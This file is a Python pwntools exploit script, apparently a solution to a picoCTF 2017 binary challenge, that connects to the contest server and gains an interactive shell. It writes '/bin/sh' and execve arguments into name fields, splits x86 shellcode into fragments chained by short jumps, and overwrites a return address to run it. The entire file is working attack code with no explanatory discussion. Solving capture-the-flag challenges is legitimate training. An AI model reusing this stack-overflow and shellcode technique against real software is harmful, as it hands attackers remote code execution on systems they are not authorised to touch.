# exploit_final_clean.py
# by Sudoite

from pwn import *
from time import sleep
import struct

local = False

# how long to wait when sleeping
if local:
	SHORT = 0.001
	LONG = 0.5
else:
	SHORT = 0.5
	LONG = 2

#if local:
#    stack_start = 
#else:
stack_start = 0xffffdb90 # Obtained via wizard sight from server
binsh_addr = stack_start + 0xa 
shellcode_start_addr = stack_start + 0xca 

pck = lambda x: struct.pack('<I', x)


def set_monsters():
	for i in range(10):
		p.recvuntil(":")
		p.send("u\n")
		sleep(SHORT)		
	p.recvuntil(":")
	p.send("u\n")


def deliver_payload(payload):
	p.send(payload)
	sleep(SHORT)
	p.recvuntil(":")


def set_names():
	deliver_payload("/bin/sh"+"\x00\x00\x00\x00"+"\n") # This location is argument 1 for call to execve()

	payload = pck(binsh_addr) # This location is argument 2 for call to execve()
	payload += "\x00\x00\x00\x00\n" # Start of the zeros is argument 3 for call to execve()
	deliver_payload(payload)

	# Filler names
	for i in range(3):
		name = chr(0x41+i)*11
		deliver_payload(name+"\n")

	# 31 c0                	xor    %eax,%eax
	# b0 0b                	mov    $0xb,%al
	# cd 80                	int    $0x80
	payload = "\x31\xc0" # xor %eax, %3ax
	payload += "\xb0\x0b" # mov $0xb, %al
	payload += "\xcd\x80" # int $0x80
	payload += "\x00\n"
	deliver_payload(payload)

	# ba dd cc bb aa       	mov    $0xaabbccdd,%edx
	payload = "\xba" + pck(stack_start + 0x11)
	payload += "\xeb\xe1" # jmp 0xffffffe3 (-31)
	payload += "\x00\n"
	deliver_payload(payload)

	# b9 dd cc bb aa       	mov    $0xaabbccdd,%ecx # address of parameter 1 for system
	payload = "\xb9" + pck(stack_start + 0x22) 
	payload += "\xeb\xe1" # jmp 0xffffffe3 (-31)
	payload += "\x00\n"
	deliver_payload(payload)

	# bb dd cc bb aa       	mov    $0xaabbccdd,%ebx # address of /bin/sh
	payload = "\xbb" + pck(binsh_addr) 
	payload += "\xeb\xe1" # jmp 0xffffffe3 (-31)
	payload += "\x00\n"
	deliver_payload(payload)

	# Filler name
	name = chr(0x48)*11
	deliver_payload(name+"\n")

	# Overwrite return address
	payload = "AB"
	payload += pck(shellcode_start_addr)
	payload += "\x00\x00\x00\x00\x00\n"
	p.send(payload)
	sleep(SHORT)


def flee_a_lot():
	for i in range(16):
		p.send("F\n")
		sleep(SHORT)
		p.recvuntil(":")
	p.send("F\n")
	sleep(SHORT)
	p.recvuntil("Game over")
	
if local:
	p = process("./choose_copy")
else:
	p = remote("shell2017.picoctf.com", 25532)
set_monsters()
set_names()
flee_a_lot()
p.interactive()